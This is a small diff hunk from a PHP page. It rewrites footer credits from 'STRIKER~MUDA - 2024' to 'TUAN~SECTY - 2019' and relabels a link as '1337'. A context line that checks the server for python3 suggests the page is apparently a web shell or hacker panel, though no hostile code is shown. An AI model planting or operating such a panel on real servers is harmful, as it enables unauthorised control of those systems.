@@ -634,8 +634,8 @@ $pythonStatus = file_exists('/usr/bin/python3') ? '<font color="green">ON</font>
         </table>
     </div>
     <center>
-        <br>STRIKER~MUDA - 2024<br>
-        <a href="https://x.ai/" target="_blank">xAI</a>
+        <br>TUAN~SECTY - 2019<br>
+        <a href="https://x.ai/" target="_blank">1337</a>
     </center>
 </body>
 </html>
